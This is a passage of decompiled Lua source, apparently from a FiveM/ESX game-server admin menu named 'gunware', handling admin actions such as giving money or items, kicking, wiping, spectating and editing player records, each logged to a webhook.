      L4_2 = GetPlayerPed
      L5_2 = A1_2.target
      L4_2 = L4_2(L5_2)
      if L4_2 then
        L4_2 = GetPlayerRoutingBucket
        L5_2 = A1_2.target
        L4_2 = L4_2(L5_2)
        L5_2 = SetPlayerRoutingBucket
        L6_2 = L2_2
        L7_2 = L4_2
        L5_2(L6_2, L7_2)
        L5_2 = logAdminAction
        L6_2 = {}
        L6_2.action = "Enter Instance"
        L7_2 = GetPlayerName
        L8_2 = L2_2
        L7_2 = L7_2(L8_2)
        L6_2.playerName = L7_2
        L7_2 = GetPlayerName
        L8_2 = A1_2.target
        L7_2 = L7_2(L8_2)
        L6_2.targetName = L7_2
        L6_2.source = L2_2
        L7_2 = A1_2.target
        L6_2.targetPlayerId = L7_2
        L7_2 = string
        L7_2 = L7_2.format
        L8_2 = "Entr\195\169e dans l'instance de %s (Bucket: %d)"
        L9_2 = GetPlayerName
        L10_2 = A1_2.target
        L9_2 = L9_2(L10_2)
        L10_2 = L4_2
        L7_2 = L7_2(L8_2, L9_2, L10_2)
        L6_2.description = L7_2
        L6_2.webhook = "instance"
        L6_2.color = 3447003
        L5_2(L6_2)
      else
        L4_2 = TriggerClientEvent
        L5_2 = "gunware:notif"
        L6_2 = L2_2
        L7_2 = "error"
        L8_2 = "Target player is not online."
        L4_2(L5_2, L6_2, L7_2, L8_2)
        L4_2 = logAdminAction
        L5_2 = {}
        L5_2.action = "Enter Instance - Erreur"
        L6_2 = GetPlayerName
        L7_2 = L2_2
        L6_2 = L6_2(L7_2)
        L5_2.playerName = L6_2
        L5_2.source = L2_2
        L6_2 = string
        L6_2 = L6_2.format
        L7_2 = "Tentative d'entr\195\169e dans l'instance d'un joueur hors ligne (ID: %d)"
        L8_2 = A1_2.target
        L6_2 = L6_2(L7_2, L8_2)
        L5_2.description = L6_2
        L5_2.webhook = "warning_action"
        L5_2.color = 16776960
        L4_2(L5_2)
      end
      return
    else
      L4_2 = A1_2.action
      if "player_giveMoney" == L4_2 then
        L4_2 = L32_1
        if L4_2 then
          L4_2 = L32_1.GetPlayerFromId
          L5_2 = A1_2.target
          L4_2 = L4_2(L5_2)
          if L4_2 then
            L5_2 = L4_2.addAccountMoney
            L6_2 = A1_2.type
            L7_2 = A1_2.amount
            L5_2(L6_2, L7_2)
            L5_2 = logAdminAction
            L6_2 = {}
            L6_2.action = "Give Money"
            L7_2 = GetPlayerName
            L8_2 = L2_2
            L7_2 = L7_2(L8_2)
            L6_2.playerName = L7_2
            L7_2 = GetPlayerName
            L8_2 = A1_2.target
            L7_2 = L7_2(L8_2)
            L6_2.targetName = L7_2
            L6_2.source = L2_2
            L7_2 = A1_2.target
            L6_2.targetPlayerId = L7_2
            L7_2 = string
            L7_2 = L7_2.format
            L8_2 = "Don de %d$ (%s) \195\160 %s"
            L9_2 = A1_2.amount
            L10_2 = A1_2.type
            L11_2 = GetPlayerName
            L12_2 = A1_2.target
            L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L11_2(L12_2)
            L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
            L6_2.description = L7_2
            L6_2.webhook = "giveMoney"
            L7_2 = A1_2.amount
            L6_2.amount = L7_2
            L7_2 = A1_2.type
            L6_2.item = L7_2
            L6_2.color = 65280
            L5_2(L6_2)
            L5_2 = TriggerClientEvent
            L6_2 = "gunware:notif"
            L7_2 = L2_2
            L8_2 = "success"
            L9_2 = string
            L9_2 = L9_2.format
            L10_2 = "Argent donn\195\169 avec succ\195\168s"
            L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L9_2(L10_2)
            L5_2(L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
          else
            L5_2 = TriggerClientEvent
            L6_2 = "gunware:notif"
            L7_2 = L2_2
            L8_2 = "error"
            L9_2 = "Joueur introuvable"
            L5_2(L6_2, L7_2, L8_2, L9_2)
            L5_2 = logAdminAction
            L6_2 = {}
            L6_2.action = "Give Money - Erreur"
            L7_2 = GetPlayerName
            L8_2 = L2_2
            L7_2 = L7_2(L8_2)
            L6_2.playerName = L7_2
            L6_2.source = L2_2
            L7_2 = string
            L7_2 = L7_2.format
            L8_2 = "Tentative de donner de l'argent \195\160 un joueur introuvable (ID: %d)"
            L9_2 = A1_2.target
            L7_2 = L7_2(L8_2, L9_2)
            L6_2.description = L7_2
            L6_2.webhook = "error_framework"
            L6_2.color = 16711680
            L5_2(L6_2)
          end
        else
          L4_2 = TriggerClientEvent
          L5_2 = "gunware:notif"
          L6_2 = L2_2
          L7_2 = "error"
          L8_2 = "ESX framework not available."
          L4_2(L5_2, L6_2, L7_2, L8_2)
          L4_2 = logAdminAction
          L5_2 = {}
          L5_2.action = "Give Money - Framework non disponible"
          L6_2 = GetPlayerName
          L7_2 = L2_2
          L6_2 = L6_2(L7_2)
          L5_2.playerName = L6_2
          L5_2.source = L2_2
          L5_2.description = "Tentative de donner de l'argent mais ESX n'est pas disponible"
          L5_2.webhook = "error_framework"
          L5_2.color = 16711680
          L4_2(L5_2)
        end
        return
      else
        L4_2 = A1_2.action
        if "player_giveItem" == L4_2 then
          L4_2 = L32_1
          if L4_2 then
            L4_2 = L32_1.GetPlayerFromId
            L5_2 = A1_2.target
            L4_2 = L4_2(L5_2)
            if L4_2 then
              L5_2 = L4_2.addInventoryItem
              L6_2 = A1_2.item
              L7_2 = A1_2.amount
              L5_2(L6_2, L7_2)
              L5_2 = logAdminAction
              L6_2 = {}
              L6_2.action = "Give Item"
              L7_2 = GetPlayerName
              L8_2 = L2_2
              L7_2 = L7_2(L8_2)
              L6_2.playerName = L7_2
              L7_2 = GetPlayerName
              L8_2 = A1_2.target
              L7_2 = L7_2(L8_2)
              L6_2.targetName = L7_2
              L6_2.source = L2_2
              L7_2 = A1_2.target
              L6_2.targetPlayerId = L7_2
              L7_2 = string
              L7_2 = L7_2.format
              L8_2 = "Don de %d x %s \195\160 %s"
              L9_2 = A1_2.amount
              L10_2 = A1_2.item
              L11_2 = GetPlayerName
              L12_2 = A1_2.target
              L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L11_2(L12_2)
              L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
              L6_2.description = L7_2
              L6_2.webhook = "giveItem"
              L7_2 = A1_2.amount
              L6_2.amount = L7_2
              L7_2 = A1_2.item
              L6_2.item = L7_2
              L6_2.color = 65280
              L5_2(L6_2)
              L5_2 = TriggerClientEvent
              L6_2 = "gunware:notif"
              L7_2 = L2_2
              L8_2 = "success"
              L9_2 = string
              L9_2 = L9_2.format
              L10_2 = "Item donn\195\169 avec succ\195\168s"
              L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L9_2(L10_2)
              L5_2(L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
            else
              L5_2 = TriggerClientEvent
              L6_2 = "gunware:notif"
              L7_2 = L2_2
              L8_2 = "error"
              L9_2 = "Joueur introuvable"
              L5_2(L6_2, L7_2, L8_2, L9_2)
              L5_2 = logAdminAction
              L6_2 = {}
              L6_2.action = "Give Item - Erreur"
              L7_2 = GetPlayerName
              L8_2 = L2_2
              L7_2 = L7_2(L8_2)
              L6_2.playerName = L7_2
              L6_2.source = L2_2
              L7_2 = string
              L7_2 = L7_2.format
              L8_2 = "Tentative de donner un item \195\160 un joueur introuvable (ID: %d)"
              L9_2 = A1_2.target
              L7_2 = L7_2(L8_2, L9_2)
              L6_2.description = L7_2
              L6_2.webhook = "error_framework"
              L6_2.color = 16711680
              L5_2(L6_2)
            end
          else
            L4_2 = TriggerClientEvent
            L5_2 = "gunware:notif"
            L6_2 = L2_2
            L7_2 = "error"
            L8_2 = "ESX framework not available."
            L4_2(L5_2, L6_2, L7_2, L8_2)
            L4_2 = logAdminAction
            L5_2 = {}
            L5_2.action = "Give Item - Framework non disponible"
            L6_2 = GetPlayerName
            L7_2 = L2_2
            L6_2 = L6_2(L7_2)
            L5_2.playerName = L6_2
            L5_2.source = L2_2
            L5_2.description = "Tentative de donner un item mais ESX n'est pas disponible"
            L5_2.webhook = "error_framework"
            L5_2.color = 16711680
            L4_2(L5_2)
          end
          return
        else
          L4_2 = A1_2.action
          if "player_kick" == L4_2 then
            L4_2 = GetPlayerName
            L5_2 = A1_2.target
            L4_2 = L4_2(L5_2)
            L5_2 = DropPlayer
            L6_2 = A1_2.target
            L7_2 = A1_2.reason
            L5_2(L6_2, L7_2)
            L5_2 = logAdminAction
            L6_2 = {}
            L6_2.action = "Kick"
            L7_2 = GetPlayerName
            L8_2 = L2_2
            L7_2 = L7_2(L8_2)
            L6_2.playerName = L7_2
            L6_2.targetName = L4_2
            L6_2.source = L2_2
            L7_2 = A1_2.target
            L6_2.targetPlayerId = L7_2
            L7_2 = string
            L7_2 = L7_2.format
            L8_2 = "Expulsion de %s - Raison: %s"
            L9_2 = L4_2
            L10_2 = A1_2.reason
            L7_2 = L7_2(L8_2, L9_2, L10_2)
            L6_2.description = L7_2
            L6_2.webhook = "kick"
            L7_2 = A1_2.reason
            L6_2.reason = L7_2
            L6_2.color = 16711680
            L5_2(L6_2)
            return
          else
            L4_2 = A1_2.action
            if "player_wipe" == L4_2 then
              L4_2 = L31_1
              if L4_2 then
                L4_2 = L31_1.Wipe
                if L4_2 then
                  L4_2 = GetPlayerName
                  L5_2 = A1_2.target
                  L4_2 = L4_2(L5_2)
                  L5_2 = L31_1.Wipe
                  L6_2 = A1_2.target
                  L5_2(L6_2)
                  L5_2 = logAdminAction
                  L6_2 = {}
                  L6_2.action = "Wipe Player"
                  L7_2 = GetPlayerName
                  L8_2 = L2_2
                  L7_2 = L7_2(L8_2)
                  L6_2.playerName = L7_2
                  L6_2.targetName = L4_2
                  L6_2.source = L2_2
                  L7_2 = A1_2.target
                  L6_2.targetPlayerId = L7_2
                  L7_2 = string
                  L7_2 = L7_2.format
                  L8_2 = "Wipe complet des donn\195\169es de %s"
                  L9_2 = L4_2
                  L7_2 = L7_2(L8_2, L9_2)
                  L6_2.description = L7_2
                  L6_2.webhook = "wipe"
                  L6_2.color = 16711680
                  L5_2(L6_2)
                  L5_2 = TriggerClientEvent
                  L6_2 = "gunware:notif"
                  L7_2 = L2_2
                  L8_2 = "success"
                  L9_2 = string
                  L9_2 = L9_2.format
                  L10_2 = "Donn\195\169es de %s effac\195\169es"
                  L11_2 = L4_2
                  L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L9_2(L10_2, L11_2)
                  L5_2(L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
              end
              else
                L4_2 = TriggerClientEvent
                L5_2 = "gunware:notif"
                L6_2 = L2_2
                L7_2 = "error"
                L8_2 = "Wipe functionality not available."
                L4_2(L5_2, L6_2, L7_2, L8_2)
                L4_2 = logAdminAction
                L5_2 = {}
                L5_2.action = "Wipe Player - Fonction non disponible"
                L6_2 = GetPlayerName
                L7_2 = L2_2
                L6_2 = L6_2(L7_2)
                L5_2.playerName = L6_2
                L5_2.source = L2_2
                L5_2.description = "Tentative de wipe mais la fonction n'est pas disponible"
                L5_2.webhook = "error_framework"
                L5_2.color = 16711680
                L4_2(L5_2)
              end
              return
            else
              L4_2 = A1_2.action
              if "player_goto" == L4_2 then
                L4_2 = getCoords
                L5_2 = A1_2.target
                L4_2 = L4_2(L5_2)
                if L4_2 then
                  L5_2 = TriggerClientEvent
                  L6_2 = "gunware:teleport"
                  L7_2 = L2_2
                  L8_2 = L4_2
                  L5_2(L6_2, L7_2, L8_2)
                  L5_2 = logAdminAction
                  L6_2 = {}
                  L6_2.action = "Goto"
                  L7_2 = GetPlayerName
                  L8_2 = L2_2
                  L7_2 = L7_2(L8_2)
                  L6_2.playerName = L7_2
                  L7_2 = GetPlayerName
                  L8_2 = A1_2.target
                  L7_2 = L7_2(L8_2)
                  L6_2.targetName = L7_2
                  L6_2.source = L2_2
                  L7_2 = A1_2.target
                  L6_2.targetPlayerId = L7_2
                  L7_2 = string
                  L7_2 = L7_2.format
                  L8_2 = "T\195\169l\195\169portation vers %s"
                  L9_2 = GetPlayerName
                  L10_2 = A1_2.target
                  L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L9_2(L10_2)
                  L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                  L6_2.description = L7_2
                  L6_2.webhook = "goto"
                  L6_2.coords = L4_2
                  L6_2.color = 3447003
                  L5_2(L6_2)
                else
                  L5_2 = TriggerClientEvent
                  L6_2 = "gunware:notif"
                  L7_2 = L2_2
                  L8_2 = "error"
                  L9_2 = "Could not get target player's coordinates."
                  L5_2(L6_2, L7_2, L8_2, L9_2)
                  L5_2 = logAdminAction
                  L6_2 = {}
                  L6_2.action = "Goto - Erreur"
                  L7_2 = GetPlayerName
                  L8_2 = L2_2
                  L7_2 = L7_2(L8_2)
                  L6_2.playerName = L7_2
                  L6_2.source = L2_2
                  L7_2 = string
                  L7_2 = L7_2.format
                  L8_2 = "Impossible de r\195\169cup\195\169rer les coordonn\195\169es du joueur %d"
                  L9_2 = A1_2.target
                  L7_2 = L7_2(L8_2, L9_2)
                  L6_2.description = L7_2
                  L6_2.webhook = "warning_action"
                  L6_2.color = 16776960
                  L5_2(L6_2)
                end
                return
              else
                L4_2 = A1_2.action
                if "player_bringBack" == L4_2 then
                  L4_2 = GetPlayerPed
                  L5_2 = A1_2.target
                  L4_2 = L4_2(L5_2)
                  if L4_2 then
                    L4_2 = TriggerClientEvent
                    L5_2 = "gunware:setToOldCoords"
                    L6_2 = A1_2.target
                    L4_2(L5_2, L6_2)
                    L4_2 = logAdminAction
                    L5_2 = {}
                    L5_2.action = "Bring Back"
                    L6_2 = GetPlayerName
                    L7_2 = L2_2
                    L6_2 = L6_2(L7_2)
                    L5_2.playerName = L6_2
                    L6_2 = GetPlayerName
                    L7_2 = A1_2.target
                    L6_2 = L6_2(L7_2)
                    L5_2.targetName = L6_2
                    L5_2.source = L2_2
                    L6_2 = A1_2.target
                    L5_2.targetPlayerId = L6_2
                    L6_2 = string
                    L6_2 = L6_2.format
                    L7_2 = "Retour aux anciennes coordonn\195\169es pour %s"
                    L8_2 = GetPlayerName
                    L9_2 = A1_2.target
                    L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2)
                    L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                    L5_2.description = L6_2
                    L5_2.webhook = "bringBack"
                    L5_2.color = 3447003
                    L4_2(L5_2)
                    L4_2 = TriggerClientEvent
                    L5_2 = "gunware:notif"
                    L6_2 = L2_2
                    L7_2 = "success"
                    L8_2 = "Joueur ramen\195\169 avec succ\195\168s"
                    L4_2(L5_2, L6_2, L7_2, L8_2)
                  else
                    L4_2 = TriggerClientEvent
                    L5_2 = "gunware:notif"
                    L6_2 = L2_2
                    L7_2 = "error"
                    L8_2 = "Target player not found or offline."
                    L4_2(L5_2, L6_2, L7_2, L8_2)
                    L4_2 = logAdminAction
                    L5_2 = {}
                    L5_2.action = "Bring Back - Erreur"
                    L6_2 = GetPlayerName
                    L7_2 = L2_2
                    L6_2 = L6_2(L7_2)
                    L5_2.playerName = L6_2
                    L5_2.source = L2_2
                    L6_2 = string
                    L6_2 = L6_2.format
                    L7_2 = "Tentative de ramener un joueur hors ligne (ID: %d)"
                    L8_2 = A1_2.target
                    L6_2 = L6_2(L7_2, L8_2)
                    L5_2.description = L6_2
                    L5_2.webhook = "warning_action"
                    L5_2.color = 16776960
                    L4_2(L5_2)
                  end
                  return
                else
                  L4_2 = A1_2.action
                  if "player_sex" == L4_2 then
                    L4_2 = getIdentifiant
                    L5_2 = A1_2.target
                    L4_2 = L4_2(L5_2)
                    if L4_2 then
                      L5_2 = L59_1
                      L6_2 = L4_2
                      L7_2 = "UPDATE users set sex = @sex WHERE identifier = @identifier"
                      L8_2 = {}
                      L9_2 = A1_2.sex
                      L8_2["@sex"] = L9_2
                      L8_2["@identifier"] = L4_2
                      L9_2 = {}
                      L9_2.action = "Change Sex"
                      L10_2 = "Changed sex to "
                      L11_2 = A1_2.sex
                      L10_2 = L10_2 .. L11_2
                      L9_2.description = L10_2
                      L9_2.webhook = "sex"
                      L10_2 = A1_2.target
                      L9_2.targetPlayerId = L10_2
                      L5_2(L6_2, L7_2, L8_2, L9_2)
                    else
                      L5_2 = TriggerClientEvent
                      L6_2 = "gunware:notif"
                      L7_2 = L2_2
                      L8_2 = "error"
                      L9_2 = "Could not get target player's identifier."
                      L5_2(L6_2, L7_2, L8_2, L9_2)
                    end
                    return
                  else
                    L4_2 = A1_2.action
                    if "player_birth" == L4_2 then
                      L4_2 = getIdentifiant
                      L5_2 = A1_2.target
                      L4_2 = L4_2(L5_2)
                      if L4_2 then
                        L5_2 = L59_1
                        L6_2 = L4_2
                        L7_2 = "UPDATE users set dateofbirth = @dateofbirth WHERE identifier = @identifier"
                        L8_2 = {}
                        L9_2 = A1_2.dateofbirth
                        L8_2["@dateofbirth"] = L9_2
                        L8_2["@identifier"] = L4_2
                        L9_2 = {}
                        L9_2.action = "Change Birth"
                        L10_2 = "Changed birth to "
                        L11_2 = A1_2.dateofbirth
                        L10_2 = L10_2 .. L11_2
                        L9_2.description = L10_2
                        L9_2.webhook = "birth"
                        L10_2 = A1_2.target
                        L9_2.targetPlayerId = L10_2
                        L5_2(L6_2, L7_2, L8_2, L9_2)
                      else
                        L5_2 = TriggerClientEvent
                        L6_2 = "gunware:notif"
                        L7_2 = L2_2
                        L8_2 = "error"
                        L9_2 = "Could not get target player's identifier."
                        L5_2(L6_2, L7_2, L8_2, L9_2)
                      end
                      return
                    else
                      L4_2 = A1_2.action
                      if "player_scale" == L4_2 then
                        L4_2 = getIdentifiant
                        L5_2 = A1_2.target
                        L4_2 = L4_2(L5_2)
                        if L4_2 then
                          L5_2 = L59_1
                          L6_2 = L4_2
                          L7_2 = "UPDATE users set height = @height WHERE identifier = @identifier"
                          L8_2 = {}
                          L9_2 = A1_2.height
                          L8_2["@height"] = L9_2
                          L8_2["@identifier"] = L4_2
                          L9_2 = {}
                          L9_2.action = "Change Scale"
                          L10_2 = "Changed height to "
                          L11_2 = A1_2.height
                          L10_2 = L10_2 .. L11_2
                          L9_2.description = L10_2
                          L9_2.webhook = "scale"
                          L10_2 = A1_2.target
                          L9_2.targetPlayerId = L10_2
                          L5_2(L6_2, L7_2, L8_2, L9_2)
                        else
                          L5_2 = TriggerClientEvent
                          L6_2 = "gunware:notif"
                          L7_2 = L2_2
                          L8_2 = "error"
                          L9_2 = "Could not get target player's identifier."
                          L5_2(L6_2, L7_2, L8_2, L9_2)
                        end
                        return
                      else
                        L4_2 = A1_2.action
                        if "player_name" == L4_2 then
                          L4_2 = getIdentifiant
                          L5_2 = A1_2.target
                          L4_2 = L4_2(L5_2)
                          if L4_2 then
                            L5_2 = L59_1
                            L6_2 = L4_2
                            L7_2 = "UPDATE users SET firstname = @firstname, lastname = @lastname WHERE identifier = @identifier"
                            L8_2 = {}
                            L9_2 = A1_2.firstname
                            L8_2["@firstname"] = L9_2
                            L9_2 = A1_2.lastname
                            L8_2["@lastname"] = L9_2
                            L8_2["@identifier"] = L4_2
                            L9_2 = {}
                            L9_2.action = "Change Name"
                            L10_2 = "Changed name to "
                            L11_2 = A1_2.firstname
                            L12_2 = " "
                            L13_2 = A1_2.lastname
                            L10_2 = L10_2 .. L11_2 .. L12_2 .. L13_2
                            L9_2.description = L10_2
                            L9_2.webhook = "name"
                            L10_2 = A1_2.target
                            L9_2.targetPlayerId = L10_2
                            L5_2(L6_2, L7_2, L8_2, L9_2)
                          else
                            L5_2 = TriggerClientEvent
                            L6_2 = "gunware:notif"
                            L7_2 = L2_2
                            L8_2 = "error"
                            L9_2 = "Could not get target player's identifier."
                            L5_2(L6_2, L7_2, L8_2, L9_2)
                          end
                          return
                        else
                          L4_2 = A1_2.action
                          if "player_spectate" == L4_2 then
                            L4_2 = GetEntityCoords
                            L5_2 = GetPlayerPed
                            L6_2 = A1_2.target
                            L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L5_2(L6_2)
                            L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                            L5_2 = TriggerClientEvent
                            L6_2 = "gunware:spectate"
                            L7_2 = L2_2
                            L8_2 = A1_2.target
                            L9_2 = L4_2
                            L5_2(L6_2, L7_2, L8_2, L9_2)
                            L5_2 = logAdminAction
                            L6_2 = {}
                            L6_2.action = "Spectate"
                            L7_2 = GetPlayerName
                            L8_2 = L2_2
                            L7_2 = L7_2(L8_2)
                            L6_2.playerName = L7_2
                            L7_2 = GetPlayerName
                            L8_2 = A1_2.target
                            L7_2 = L7_2(L8_2)
                            L6_2.targetName = L7_2
                            L6_2.source = L2_2
                            L7_2 = A1_2.target
                            L6_2.targetPlayerId = L7_2
                            L7_2 = string
                            L7_2 = L7_2.format
                            L8_2 = "Spectate de %s"
                            L9_2 = GetPlayerName
                            L10_2 = A1_2.target
                            L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L9_2(L10_2)
                            L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                            L6_2.description = L7_2
                            L6_2.webhook = "spectate"
                            L7_2 = {}
                            L8_2 = L4_2.x
                            L7_2.x = L8_2
                            L8_2 = L4_2.y
                            L7_2.y = L8_2
                            L8_2 = L4_2.z
                            L7_2.z = L8_2
                            L6_2.coords = L7_2
                            L6_2.color = 3447003
                            L5_2(L6_2)
                            return
                          else
                            L4_2 = A1_2.action
                            if "player_spectate2" == L4_2 then
                              L4_2 = TriggerClientEvent
                              L5_2 = "gunware:spectate:random"
                              L6_2 = L2_2
                              L4_2(L5_2, L6_2)
                              L4_2 = logAdminAction
                              L5_2 = {}
                              L5_2.action = "Spectate Random"
                              L6_2 = GetPlayerName
                              L7_2 = L2_2
                              L6_2 = L6_2(L7_2)
                              L5_2.playerName = L6_2
                              L5_2.source = L2_2
                              L5_2.description = "Spectate al\195\169atoire activ\195\169"
                              L5_2.webhook = "spectate_random"
                              L5_2.color = 3447003
                              L4_2(L5_2)
                              return
                            else
                              L4_2 = A1_2.action
                              if "player_takeControl" == L4_2 then
                                L4_2 = tonumber
                                L5_2 = A1_2.target
                                L4_2 = L4_2(L5_2)
                                if not L4_2 or L4_2 <= 0 then
                                  L5_2 = TriggerClientEvent
                                  L6_2 = "gunware:notif"
                                  L7_2 = L2_2
                                  L8_2 = "error"
                                  L9_2 = "Cible invalide pour la prise de controle"
                                  L5_2(L6_2, L7_2, L8_2, L9_2)
                                  return
                                end
                                if L2_2 == L4_2 then
                                  L5_2 = TriggerClientEvent
                                  L6_2 = "gunware:notif"
                                  L7_2 = L2_2
                                  L8_2 = "error"
                                  L9_2 = "Impossible de prendre le controle de soi-meme"
                                  L5_2(L6_2, L7_2, L8_2, L9_2)
                                  return
                                end
                                L5_2 = GetPlayerName
                                L6_2 = L4_2
                                L5_2 = L5_2(L6_2)
                                if not L5_2 then
                                  L5_2 = TriggerClientEvent
                                  L6_2 = "gunware:notif"
                                  L7_2 = L2_2
                                  L8_2 = "error"
                                  L9_2 = "Le joueur cible n'est plus connecte"
                                  L5_2(L6_2, L7_2, L8_2, L9_2)
                                  return
                                end
                                L5_2 = L5_1
                                L5_2 = L5_2[L2_2]
                                if L5_2 == L4_2 then
                                  L5_2 = L12_1
                                  L6_2 = L2_2
                                  L7_2 = "toggle_off"
                                  L8_2 = false
                                  L9_2 = false
                                  L5_2(L6_2, L7_2, L8_2, L9_2)
                                  L5_2 = TriggerClientEvent
                                  L6_2 = "gunware:notif"
                                  L7_2 = L2_2
                                  L8_2 = "info"
                                  L9_2 = "Prise de controle desactivee"
                                  L5_2(L6_2, L7_2, L8_2, L9_2)
                                  return
                                end
                                L5_2 = L13_1
                                L6_2 = L2_2
                                L7_2 = "new_session"
                                L5_2(L6_2, L7_2)
                                L5_2 = L13_1
                                L6_2 = L4_2
                                L7_2 = "new_session"
                                L5_2(L6_2, L7_2)
                                L5_2 = GetPlayerName
                                L6_2 = L4_2
                                L5_2 = L5_2(L6_2)
                                if not L5_2 then
                                  L5_2 = "ID "
                                  L6_2 = tostring
                                  L7_2 = L4_2
                                  L6_2 = L6_2(L7_2)
                                  L5_2 = L5_2 .. L6_2
                                end
                                L6_2 = L5_1
                                L6_2[L2_2] = L4_2
                                L6_2 = L6_1
                                L6_2[L4_2] = L2_2
                                L6_2 = TriggerClientEvent
                                L7_2 = "gunware:takecontrol:start"
                                L8_2 = L2_2
                                L9_2 = {}
                                L9_2.target = L4_2
                                L9_2.targetName = L5_2
                                L6_2(L7_2, L8_2, L9_2)
                                L6_2 = TriggerClientEvent
                                L7_2 = "gunware:takecontrol:lock"
                                L8_2 = L4_2
                                L9_2 = {}
                                L9_2.adminSrc = L2_2
                                L10_2 = GetPlayerName
                                L11_2 = L2_2
                                L10_2 = L10_2(L11_2)
                                if not L10_2 then
                                  L10_2 = "ID "
                                  L11_2 = tostring
                                  L12_2 = L2_2
                                  L11_2 = L11_2(L12_2)
                                  L10_2 = L10_2 .. L11_2
                                end
                                L9_2.adminName = L10_2
                                L6_2(L7_2, L8_2, L9_2)
                                L6_2 = logAdminAction
                                L7_2 = {}
                                L7_2.action = "Take Control"
                                L8_2 = GetPlayerName
                                L9_2 = L2_2
                                L8_2 = L8_2(L9_2)
                                L7_2.playerName = L8_2
                                L7_2.targetName = L5_2
                                L7_2.source = L2_2
                                L7_2.targetPlayerId = L4_2
                                L8_2 = string
                                L8_2 = L8_2.format
                                L9_2 = "Prise de controle de %s"
                                L10_2 = L5_2
                                L8_2 = L8_2(L9_2, L10_2)
                                L7_2.description = L8_2
                                L7_2.webhook = "spectate"
                                L7_2.color = 3447003
                                L6_2(L7_2)
                                return
                              else
                                L4_2 = A1_2.action
                                if "player_warn" == L4_2 then
                                  L4_2 = TriggerClientEvent
                                  L5_2 = "txcl:showWarning"
                                  L6_2 = A1_2.target
                                  L7_2 = GetPlayerName
                                  L8_2 = L2_2
                                  L7_2 = L7_2(L8_2)
                                  L8_2 = A1_2.reason
                                  L4_2(L5_2, L6_2, L7_2, L8_2)
                                  L4_2 = logAdminAction
                                  L5_2 = {}
                                  L5_2.action = "Warn"
                                  L6_2 = GetPlayerName
                                  L7_2 = L2_2
                                  L6_2 = L6_2(L7_2)
                                  L5_2.playerName = L6_2
                                  L6_2 = GetPlayerName
                                  L7_2 = A1_2.target
                                  L6_2 = L6_2(L7_2)
                                  L5_2.targetName = L6_2
                                  L5_2.source = L2_2
                                  L6_2 = A1_2.target
                                  L5_2.targetPlayerId = L6_2
                                  L6_2 = string
                                  L6_2 = L6_2.format
                                  L7_2 = "Avertissement donn\195\169 \195\160 %s"
                                  L8_2 = GetPlayerName
                                  L9_2 = A1_2.target
                                  L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2)
                                  L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                  L5_2.description = L6_2
                                  L5_2.webhook = "warn"
                                  L6_2 = A1_2.reason
                                  L5_2.reason = L6_2
                                  L5_2.color = 16776960
                                  L4_2(L5_2)
                                  return
                                else
                                  L4_2 = A1_2.action
                                  if "player_revive" == L4_2 then
                                    L4_2 = L31_1
                                    if L4_2 then
                                      L4_2 = L31_1.revive
                                      if L4_2 then
                                        L4_2 = L31_1.revive
                                        L5_2 = A1_2.target
                                        L4_2(L5_2)
                                        L4_2 = logAdminAction
                                        L5_2 = {}
                                        L5_2.action = "Revive"
                                        L6_2 = GetPlayerName
                                        L7_2 = L2_2
                                        L6_2 = L6_2(L7_2)
                                        L5_2.playerName = L6_2
                                        L6_2 = GetPlayerName
                                        L7_2 = A1_2.target
                                        L6_2 = L6_2(L7_2)
                                        L5_2.targetName = L6_2
                                        L5_2.source = L2_2
                                        L6_2 = A1_2.target
                                        L5_2.targetPlayerId = L6_2
                                        L6_2 = string
                                        L6_2 = L6_2.format
                                        L7_2 = "R\195\169animation de %s"
                                        L8_2 = GetPlayerName
                                        L9_2 = A1_2.target
                                        L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2)
                                        L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                        L5_2.description = L6_2
                                        L5_2.webhook = "revive"
                                        L5_2.color = 65280
                                        L4_2(L5_2)
                                        L4_2 = TriggerClientEvent
                                        L5_2 = "gunware:notif"
